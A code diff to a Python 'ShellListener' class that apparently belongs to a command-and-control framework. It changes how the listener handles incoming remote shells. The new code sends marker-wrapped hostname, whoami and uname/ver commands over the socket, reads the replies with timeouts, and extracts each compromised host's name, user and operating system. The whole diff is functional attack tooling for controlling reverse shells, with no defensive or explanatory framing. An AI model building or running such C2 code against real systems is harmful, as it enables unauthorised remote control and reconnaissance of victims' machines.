@@ -209,44 +209,67 @@ class ShellListener:
                     shell_user = ""
                     default_hostname = f"host-{ip}"
                     
-                    # Try to get hostname
-                    conn.sendall(b'hostname\n')
-                    time.sleep(0.5)
-                    try:
-                        hostname_raw = conn.recv(1024).decode('utf-8', errors='replace')
-                        hostname = clean_shell_output(hostname_raw).strip()
-                        if not hostname:
-                            hostname = default_hostname
-                    except:
+                    # Use unique markers to extract clean output
+                    marker_start = "C2_START_MARKER"
+                    marker_end = "C2_END_MARKER"
+                    
+                    def _extract_output(raw: str, marker_s: str, marker_e: str) -> str:
+                        """Extract output between markers, falling back to cleaning."""
+                        if marker_s in raw and marker_e in raw:
+                            start = raw.index(marker_s) + len(marker_s)
+                            end = raw.index(marker_e)
+                            return raw[start:end].strip()
+                        # Fallback: clean the raw output
+                        cleaned = clean_shell_output(raw).strip()
+                        # Remove lines that look like the command itself
+                        lines = [l for l in cleaned.split('\n') if l.strip()]
+                        # Return last non-empty line (usually the output)
+                        return lines[-1].strip() if lines else ""
+                    
+                    def _send_and_recv(cmd_str: str) -> str:
+                        """Send a command and receive output."""
+                        conn.sendall(cmd_str.encode('utf-8'))
+                        time.sleep(1.0)
+                        chunks = b""
+                        conn.settimeout(2)
+                        try:
+                            while True:
+                                chunk = conn.recv(4096)
+                                if not chunk:
+                                    break
+                                chunks += chunk
+                        except socket.timeout:
+                            pass
+                        except Exception:
+                            pass
+                        return chunks.decode('utf-8', errors='replace')
+                    
+                    # Try to get hostname using markers
+                    hostname_cmd = f'echo {marker_start}; hostname 2>/dev/null || echo unknown; echo {marker_end}\n'
+                    hostname_raw = _send_and_recv(hostname_cmd)
+                    hostname = _extract_output(hostname_raw, marker_start, marker_end)
+                    if not hostname or hostname == "unknown":
                         hostname = default_hostname
                     
-                    # Try to get username
-                    conn.sendall(b'whoami 2>/dev/null || echo %USERNAME%\n')
-                    time.sleep(0.5)
-                    try:
-                        shell_user_raw = conn.recv(1024).decode('utf-8', errors='replace')
-                        shell_user = clean_shell_output(shell_user_raw).strip()
-                        if not shell_user:
-                            shell_user = "unknown"
-                    except:
+                    # Try to get username using markers
+                    user_cmd = f'echo {marker_start}; whoami 2>/dev/null || echo %USERNAME% 2>nul || echo unknown; echo {marker_end}\n'
+                    shell_user_raw = _send_and_recv(user_cmd)
+                    shell_user = _extract_output(shell_user_raw, marker_start, marker_end)
+                    if not shell_user or shell_user == "unknown":
                         shell_user = "unknown"
                     
-                    # Try to detect OS
-                    conn.sendall(b'uname -a 2>/dev/null || ver\n')
-                    time.sleep(0.5)
-                    try:
-                        os_info_raw = conn.recv(2048).decode('utf-8', errors='replace')
-                        os_info = clean_shell_output(os_info_raw).strip()
-                        if 'Linux' in os_info:
-                            platform = 'Linux'
-                        elif 'Darwin' in os_info:
-                            platform = 'macOS'
-                        elif 'Windows' in os_info or 'Microsoft' in os_info:
-                            platform = 'Windows'
-                        else:
-                            platform = 'Unknown'
-                    except:
-                        platform = "unknown"
+                    # Try to detect OS using markers
+                    os_cmd = f'echo {marker_start}; uname -s 2>/dev/null || ver 2>nul || echo unknown; echo {marker_end}\n'
+                    os_info_raw = _send_and_recv(os_cmd)
+                    os_info = _extract_output(os_info_raw, marker_start, marker_end)
+                    if 'Linux' in os_info:
+                        platform = 'Linux'
+                    elif 'Darwin' in os_info:
+                        platform = 'macOS'
+                    elif 'Windows' in os_info or 'Microsoft' in os_info:
+                        platform = 'Windows'
+                    else:
+                        platform = 'Unknown'
                         
                 except Exception:
                     hostname = default_hostname
